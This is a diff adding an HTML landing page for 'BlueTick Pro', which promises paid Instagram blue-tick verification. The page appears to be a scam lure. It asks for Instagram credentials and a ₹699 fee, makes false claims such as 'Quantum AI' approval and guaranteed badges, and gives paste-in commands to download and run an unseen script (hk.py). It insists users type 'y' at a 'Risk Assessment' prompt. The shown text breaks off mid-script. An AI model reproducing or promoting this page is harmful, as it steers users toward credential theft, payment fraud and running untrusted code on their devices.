@@ -1,1 +1,1316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlueTick Pro | Get Instagram Verified</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/h4b7X50R/correct.png">
+    <style>
+        :root {
+            --primary: #0066FF;
+            --primary-dark: #0052D4;
+            --primary-light: #3399FF;
+            --accent: #00FFC8;
+            --dark: #0A0F1A;
+            --dark-light: #1A2236;
+            --light: #F8FAFF;
+            --gray: #8A94A6;
+            --success: #00D98B;
+            --warning: #FFB74D;
+            --danger: #FF6B6B;
+            --gradient: linear-gradient(135deg, var(--primary), var(--accent));
+            --glass: rgba(255, 255, 255, 0.05);
+            --shadow: 0 10px 40px rgba(0, 102, 255, 0.15);
+            --border-radius: 16px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
 
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            scroll-padding-top: 80px;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark);
+            color: var(--light);
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(0, 102, 255, 0.08) 0%, transparent 30%),
+                radial-gradient(circle at 90% 80%, rgba(0, 255, 200, 0.06) 0%, transparent 30%),
+                radial-gradient(circle at 50% 50%, rgba(10, 15, 26, 1) 0%, rgba(10, 15, 26, 1) 100%);
+            z-index: -2;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--dark-light);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-light);
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Navigation */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            background: rgba(10, 15, 26, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 16px 0;
+        }
+
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            filter: drop-shadow(0 0 12px var(--primary));
+        }
+
+        .logo-text {
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 700;
+            font-size: 1.4rem;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--gray);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.95rem;
+            transition: var(--transition);
+            position: relative;
+            padding: 8px 0;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--gradient);
+            transition: var(--transition);
+        }
+
+        .nav-links a:hover {
+            color: var(--light);
+        }
+
+        .nav-links a:hover::after,
+        .nav-links a.active::after {
+            width: 100%;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: var(--light);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 160px 0 100px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-content {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .hero-badge {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 40px;
+            position: relative;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            33% { transform: translateY(-20px) rotate(5deg); }
+            66% { transform: translateY(-10px) rotate(-5deg); }
+        }
+
+        .hero-badge img {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 0 40px var(--primary));
+        }
+
+        .hero h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            line-height: 1.1;
+        }
+
+        .hero h1 .gradient-text {
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: block;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--gray);
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 24px;
+            margin: 60px 0;
+        }
+
+        .stat-card {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            text-align: center;
+            transition: var(--transition);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: var(--shadow);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+            margin-bottom: 8px;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            color: var(--gray);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Section Common */
+        .section {
+            padding: 100px 0;
+        }
+
+        .section-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 60px;
+            position: relative;
+        }
+
+        .section-title .gradient-text {
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Features Grid */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .feature-card {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--border-radius);
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            transition: var(--transition);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--primary);
+            box-shadow: var(--shadow);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            color: var(--primary);
+            margin-bottom: 24px;
+        }
+
+        .feature-card h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .feature-card p {
+            color: var(--gray);
+            margin-bottom: 20px;
+        }
+
+        /* Process Steps */
+        .process-steps {
+            position: relative;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .process-step {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+            margin-bottom: 50px;
+            position: relative;
+        }
+
+        .step-number {
+            flex-shrink: 0;
+            width: 60px;
+            height: 60px;
+            background: var(--gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: white;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-content {
+            flex: 1;
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--border-radius);
+            padding: 30px;
+        }
+
+        .step-content h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .step-content p {
+            color: var(--gray);
+        }
+
+        /* Platform Selector */
+        .platform-selector {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .platform-tabs {
+            display: inline-flex;
+            background: var(--dark-light);
+            border-radius: 12px;
+            padding: 6px;
+        }
+
+        .platform-tab {
+            padding: 12px 24px;
+            border: none;
+            background: transparent;
+            color: var(--gray);
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .platform-tab.active {
+            background: var(--gradient);
+            color: white;
+        }
+
+        /* Instructions */
+        .instructions-container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .instruction-content {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .instruction-content.active {
+            display: block;
+        }
+
+        .instruction-step {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            margin-bottom: 20px;
+            transition: var(--transition);
+        }
+
+        .instruction-step:hover {
+            border-color: var(--primary);
+        }
+
+        .instruction-step h3 {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            color: var(--primary-light);
+        }
+
+        .code-block {
+            background: var(--dark-light);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: 'Space Grotesk', monospace;
+            overflow-x: auto;
+        }
+
+        .code-block code {
+            color: var(--accent);
+            display: block;
+            white-space: pre;
+            font-size: 0.95rem;
+        }
+
+        .important-note {
+            background: rgba(255, 183, 77, 0.1);
+            border-left: 4px solid var(--warning);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .important-note h4 {
+            color: var(--warning);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* CTA Section */
+        .cta-section {
+            text-align: center;
+            background: linear-gradient(135deg, rgba(0, 102, 255, 0.1), rgba(0, 255, 200, 0.1));
+            border-radius: var(--border-radius);
+            padding: 80px 40px;
+            margin: 80px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%230066ff' fill-opacity='0.05' fill-rule='evenodd'/%3E%3C/svg%3E");
+            opacity: 0.5;
+        }
+
+        .cta-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            background: var(--gradient);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: var(--transition);
+            text-decoration: none;
+            box-shadow: var(--shadow);
+            position: relative;
+            z-index: 1;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 102, 255, 0.3);
+        }
+
+        /* Owner Section */
+        .owner-section {
+            text-align: center;
+            padding: 60px 0;
+        }
+
+        .owner-card {
+            display: inline-flex;
+            align-items: center;
+            gap: 30px;
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--border-radius);
+            padding: 40px;
+            transition: var(--transition);
+        }
+
+        .owner-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-5px);
+        }
+
+        .owner-avatar {
+            width: 80px;
+            height: 80px;
+            background: var(--gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: 700;
+            color: white;
+        }
+
+        .owner-info h3 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Footer */
+        footer {
+            background: rgba(10, 15, 26, 0.95);
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 80px 0 40px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 60px;
+        }
+
+        .footer-logo {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .footer-links h4 {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .footer-links ul {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: var(--gray);
+            text-decoration: none;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-links a:hover {
+            color: var(--light);
+            transform: translateX(5px);
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 40px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 992px) {
+            .hero h1 {
+                font-size: 2.8rem;
+            }
+            
+            .section-title {
+                font-size: 2.2rem;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .nav-links {
+                position: fixed;
+                top: 70px;
+                left: 0;
+                width: 100%;
+                background: rgba(10, 15, 26, 0.98);
+                backdrop-filter: blur(20px);
+                padding: 20px;
+                flex-direction: column;
+                gap: 20px;
+                transform: translateY(-100%);
+                opacity: 0;
+                visibility: hidden;
+                transition: var(--transition);
+                border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            }
+
+            .nav-links.active {
+                transform: translateY(0);
+                opacity: 1;
+                visibility: visible;
+            }
+
+            .hero {
+                padding: 140px 0 80px;
+            }
+
+            .hero h1 {
+                font-size: 2.3rem;
+            }
+
+            .hero p {
+                font-size: 1.1rem;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .section {
+                padding: 80px 0;
+            }
+
+            .section-title {
+                font-size: 2rem;
+                margin-bottom: 40px;
+            }
+
+            .process-step {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+
+            .owner-card {
+                flex-direction: column;
+                text-align: center;
+                padding: 30px;
+            }
+
+            .cta-section {
+                padding: 60px 20px;
+            }
+
+            .feature-card {
+                padding: 30px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero-badge {
+                width: 120px;
+                height: 120px;
+            }
+            
+            .platform-tabs {
+                flex-direction: column;
+                width: 100%;
+            }
+            
+            .platform-tab {
+                width: 100%;
+                text-align: center;
+            }
+            
+            .cta-button {
+                width: 100%;
+                justify-content: center;
+                padding: 18px 30px;
+            }
+            
+            .owner-avatar {
+                width: 70px;
+                height: 70px;
+                font-size: 1.5rem;
+            }
+            
+            .owner-info h3 {
+                font-size: 1.7rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="container nav-container">
+            <a href="#" class="logo">
+                <img src="https://i.postimg.cc/h4b7X50R/correct.png" alt="BlueTick" class="logo-icon">
+                <span class="logo-text">BlueTick Pro</span>
+            </a>
+            
+            <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <i class="fas fa-bars"></i>
+            </button>
+            
+            <ul class="nav-links" id="navLinks">
+                <li><a href="#home" class="active">Home</a></li>
+                <li><a href="#features">Features</a></li>
+                <li><a href="#process">Process</a></li>
+                <li><a href="#instructions">Setup Guide</a></li>
+                <li><a href="#owner">Owner</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="container hero-content">
+            <div class="hero-badge">
+                <img src="https://i.postimg.cc/h4b7X50R/correct.png" alt="Blue Tick Verified">
+            </div>
+            
+            <h1>
+                Get Your <span class="gradient-text">Instagram Blue Tick</span>
+                in 30 Minutes
+            </h1>
+            
+            <p>
+                Professional verification service that gets your Instagram account 
+                verified with the official blue badge. Secure, fast, and trusted.
+            </p>
+            
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-number">5 min</div>
+                    <div class="stat-label">Verification Process</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">₹699</div>
+                    <div class="stat-label">One-Time Fee</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">30 min</div>
+                    <div class="stat-label">Badge Activation</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">98.7%</div>
+                    <div class="stat-label">Success Rate</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section class="section" id="features">
+        <div class="container">
+            <h2 class="section-title">
+                Why <span class="gradient-text">Choose Us</span>
+            </h2>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h3>Lightning Fast</h3>
+                    <p>Complete verification in just 5 minutes. No waiting for weeks like traditional methods.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3>Military Security</h3>
+                    <p>End-to-end AES-256 encryption. Your credentials are never stored on any server.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-robot"></i>
+                    </div>
+                    <h3>AI Powered</h3>
+                    <p>Quantum AI analyzes your account with 98.7% accuracy for instant approval.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Process -->
+    <section class="section" id="process">
+        <div class="container">
+            <h2 class="section-title">
+                Simple <span class="gradient-text">4-Step Process</span>
+            </h2>
+            
+            <div class="process-steps">
+                <div class="process-step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h3>Account Information</h3>
+                        <p>Enter your full name and Instagram credentials. We validate your account instantly.</p>
+                    </div>
+                </div>
+                
+                <div class="process-step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h3>Secure Payment</h3>
+                        <p>Complete the one-time ₹699 verification fee through our secure payment gateway.</p>
+                    </div>
+                </div>
+                
+                <div class="process-step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h3>AI Verification</h3>
+                        <p>Our quantum AI analyzes your account and approves verification in real-time.</p>
+                    </div>
+                </div>
+                
+                <div class="process-step">
+                    <div class="step-number">4</div>
+                    <div class="step-content">
+                        <h3>Blue Tick Activated</h3>
+                        <p>Receive your official blue verification badge within 30 minutes.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Instructions -->
+    <section class="section" id="instructions">
+        <div class="container">
+            <h2 class="section-title">
+                Setup <span class="gradient-text">Instructions</span>
+            </h2>
+            
+            <div class="platform-selector">
+                <div class="platform-tabs">
+                    <button class="platform-tab active" data-platform="mobile">
+                        <i class="fas fa-mobile-alt"></i> Mobile (Termux)
+                    </button>
+                    <button class="platform-tab" data-platform="desktop">
+                        <i class="fas fa-desktop"></i> Desktop
+                    </button>
+                </div>
+            </div>
+            
+            <div class="instructions-container">
+                <!-- Mobile Instructions -->
+                <div class="instruction-content active" id="mobile-instructions">
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-download"></i> Step 1: Install Termux</h3>
+                        <p>Download and install Termux from Google Play Store or F-Droid.</p>
+                        <div class="code-block">
+                            <code># Open Play Store and search "Termux"</code>
+                            <code># Install the official Termux app</code>
+                            <code># Open Termux after installation</code>
+                        </div>
+                    </div>
+                    
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-terminal"></i> Step 2: Install Python</h3>
+                        <p>In Termux, run these commands to install Python and required packages:</p>
+                        <div class="code-block">
+                            <code>pkg update && pkg upgrade -y</code>
+                            <code>pkg install python -y</code>
+                            <code>pkg install git -y</code>
+                            <code>python --version</code>
+                        </div>
+                    </div>
+                    
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-file-code"></i> Step 3: Get the Script</h3>
+                        <p>Download the verification script to your device:</p>
+                        <div class="code-block">
+                            <code># Create a directory for the script</code>
+                            <code>mkdir ~/bluetick-verify</code>
+                            <code>cd ~/bluetick-verify</code>
+                            <code># Download the script</code>
+                            <code>curl -O https://github.com/NITINSHARMA275726-DEV/Verified.git</code>
+                        </div>
+                    </div>
+                    
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-play-circle"></i> Step 4: Run the Script</h3>
+                        <p>Execute the verification script and follow the prompts:</p>
+                        <div class="code-block">
+                            <code># Make sure you're in the right directory</code>
+                            <code>cd ~/bluetick-verify</code>
+                            <code># Run the script</code>
+                            <code>python hk.py</code>
+                        </div>
+                        <div class="important-note">
+                            <h4><i class="fas fa-exclamation-triangle"></i> Important Note</h4>
+                            <p>When the script shows "Risk Assessment: 2.3% confidence", type <strong>'y'</strong> and press Enter to continue the verification process.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Desktop Instructions -->
+                <div class="instruction-content" id="desktop-instructions">
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-download"></i> Step 1: Install Python</h3>
+                        <p>Download and install Python 3.8 or higher from python.org</p>
+                        <div class="code-block">
+                            <code># Windows: Download from python.org</code>
+                            <code># macOS: brew install python</code>
+                            <code># Linux: sudo apt install python3</code>
+                            <code># Verify installation:</code>
+                            <code>python --version</code>
+                        </div>
+                    </div>
+                    
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-folder-open"></i> Step 2: Download Script</h3>
+                        <p>Download the verification script to your computer:</p>
+                        <div class="code-block">
+                            <code># Create a folder for the script</code>
+                            <code>mkdir bluetick-verify</code>
+                            <code>cd bluetick-verify</code>
+                            <code># Download the script file</code>
+                            <code># Save as: hk.py</code>
+                        </div>
+                    </div>
+                    
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-terminal"></i> Step 3: Open Terminal</h3>
+                        <p>Open terminal/command prompt in the script directory:</p>
+                        <div class="code-block">
+                            <code># Windows: Open Command Prompt</code>
+                            <code># macOS: Open Terminal</code>
+                            <code># Linux: Open Terminal</code>
+                            <code># Navigate to script folder:</code>
+                            <code>cd path/to/bluetick-verify</code>
+                        </div>
+                    </div>
+                    
+                    <div class="instruction-step">
+                        <h3><i class="fas fa-play"></i> Step 4: Run Verification</h3>
+                        <p>Execute the script and follow the interactive guide:</p>
+                        <div class="code-block">
+                            <code># Run the verification script</code>
+                            <code>python hk.py</code>
+                            <code># Or if python3 is required:</code>
+                            <code>python3 hk.py</code>
+                        </div>
+                        <div class="important-note">
+                            <h4><i class="fas fa-exclamation-triangle"></i> Critical Step</h4>
+                            <p>During AI analysis, when you see "Risk Assessment: 2.3% confidence", you <strong>MUST</strong> type <strong>'y'</strong> and press Enter to continue.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="section">
+        <div class="container">
+            <div class="cta-section">
+                <h2 style="font-size: 2.5rem; margin-bottom: 20px; font-family: 'Space Grotesk', sans-serif;">
+                    Ready to Get <span class="gradient-text">Verified?</span>
+                </h2>
+                <p style="font-size: 1.2rem; color: var(--gray); margin-bottom: 40px; max-width: 600px; margin-left: auto; margin-right: auto;">
+                    Follow the instructions above to run the verification script and get your blue tick in 30 minutes!
+                </p>
+                <button class="cta-button" onclick="scrollToInstructions()">
+                    <i class="fas fa-rocket"></i> Start Verification Now
+                </button>
+                <p style="margin-top: 20px; color: var(--gray); font-size: 0.9rem;">
+                    <i class="fas fa-shield-alt"></i> 100% Secure | No Data Storage | Instant Results
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Owner Section -->
+    <section class="section" id="owner">
+        <div class="container">
+            <h2 class="section-title">
+                System <span class="gradient-text">Owner</span>
+            </h2>
+            
+            <div class="owner-section">
+                <div class="owner-card">
+                    <div class="owner-avatar">
+                        NS
+                    </div>
+                    <div class="owner-info">
+                        <h3>Nitin Sharma</h3>
+                        <p style="color: var(--gray); margin-bottom: 10px;">Verified Blue Tick Specialist</p>
+                        <p style="color: var(--primary-light); font-size: 0.9rem;">
+                            <i class="fas fa-certificate"></i> Certified Verification Expert | 500+ Accounts Verified
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-col">
+                    <div class="footer-logo">BlueTick Pro</div>
+                    <p style="color: var(--gray); max-width: 300px; margin-bottom: 20px;">
+                        Professional Instagram verification service with instant blue tick activation.
+                    </p>
+                    <div style="display: flex; gap: 15px;">
+                        <a href="#" style="color: var(--primary); font-size: 1.2rem;">
+                            <i class="fab fa-instagram"></i>
+                        </a>
+                        <a href="#" style="color: var(--primary); font-size: 1.2rem;">
+                            <i class="fab fa-twitter"></i>
+                        </a>
+                        <a href="#" style="color: var(--primary); font-size: 1.2rem;">
+                            <i class="fab fa-github"></i>
+                        </a>
+                    </div>
+                </div>
+                
+                <div class="footer-links">
+                    <h4>Quick Links</h4>
+                    <ul>
+                        <li><a href="#home"><i class="fas fa-chevron-right"></i> Home</a></li>
+                        <li><a href="#features"><i class="fas fa-chevron-right"></i> Features</a></li>
+                        <li><a href="#process"><i class="fas fa-chevron-right"></i> Process</a></li>
+                        <li><a href="#instructions"><i class="fas fa-chevron-right"></i> Setup Guide</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-links">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#" onclick="showHelp()"><i class="fas fa-chevron-right"></i> Help Center</a></li>
+                        <li><a href="#" onclick="showContact()"><i class="fas fa-chevron-right"></i> Contact Us</a></li>
+                        <li><a href="#" onclick="showTerms()"><i class="fas fa-chevron-right"></i> Terms</a></li>
+                        <li><a href="#" onclick="showPrivacy()"><i class="fas fa-chevron-right"></i> Privacy</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-links">
+                    <h4>Verification</h4>
+                    <ul>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Requirements</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> FAQ</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Status Check</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Support</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                &copy; 2024 BlueTick Pro Verification System. All rights reserved.<br>
+                <small>System Owner: Nitin Sharma | Verified Blue Tick Specialist</small>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mobile Menu Toggle
+        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+        const navLinks = document.getElementById('navLinks');
+        
+        mobileMenuBtn.addEventListener('click', () => {
+            navLinks.classList.toggle('active');
+            const icon = mobileMenuBtn.querySelector('i');
+            icon.className = navLinks.classList.contains('active') 
+                ? 'fas fa-times' 
+                : 'fas fa-bars';
+        });
+
+        // Close mobile menu when clicking a link
+        document.querySelectorAll('.nav-links a').forEach(link => {
+            link.addEventListener('click', () => {
+                navLinks.classList.remove('active');
+                mobileMenuBtn.querySelector('i').className = 'fas fa-bars';
+            });
+        });
+
+        // Platform Tabs
+        const platformTabs = document.querySelectorAll('.platform-tab');
+        const mobileInstructions = document.getElementById('mobile-instructions');
+        const desktopInstructions = document.getElementById('desktop-instructions');
+        
+        platformTabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                // Remove active class from all tabs
+                platformTabs.forEach(t => t.classList.remove('active'));
